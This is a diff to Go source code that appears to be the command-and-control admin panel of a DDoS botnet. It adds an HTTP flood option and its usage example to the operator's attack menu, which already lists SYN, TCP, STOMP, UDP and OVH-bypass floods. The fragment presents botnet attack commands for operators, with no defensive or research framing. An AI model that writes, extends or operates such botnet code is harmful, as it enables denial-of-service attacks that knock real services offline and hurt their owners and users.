@@ -134,6 +134,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\r\n"))
 			this.conn.Write([]byte("\x1b[1;36mPreset\x1b[1;31m:\x1b[1;31m !stdflood <target> <time>\x1b[0m\r\n"))
             this.conn.Write([]byte("\x1b[1;36mExample\x1b[1;31m:\x1b[1;31m !stdflood 1.1.1.1 30 dport=80 len=1400\x1b[0m\r\n"))
+	    this.conn.Write([]byte("\x1b[1;36mExample\x1b[1;31m:\x1b[1;31m !httpflood 1.1.1.1 30 domain=1.1.1.1 path=/ conns=15000\x1b[0m\r\n"))
             this.conn.Write([]byte("\r\n"))
 			this.conn.Write([]byte("\x1b[1;36mtcpflood\x1b[1;31m: \x1b[0mTCP flood             \x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;36mcustomflood\x1b[1;31m: \x1b[0mCUSTOM udp flood   \x1b[0m\r\n"))
@@ -144,6 +145,7 @@ func (this *Admin) Handle() {
             this.conn.Write([]byte("\x1b[1;36mstompflood\x1b[1;31m: \x1b[0mTCP STOMP flood     \x1b[0m\r\n"))
             this.conn.Write([]byte("\x1b[1;36msynflood\x1b[1;31m: \x1b[0mTCP SYN flood         \x1b[0m\r\n"))
             this.conn.Write([]byte("\x1b[1;36movhbypass\x1b[1;31m: \x1b[0mOVH UDP Hex flood    \x1b[0m\r\n"))
+	    this.conn.Write([]byte("\x1b[1;36mhttpflood\x1b[1;31m: \x1b[0mNormal http flood    \x1b[0m\r\n"))
 			this.conn.Write([]byte("\r\n"))
 			this.conn.Write([]byte("\r\n"))
 			continue
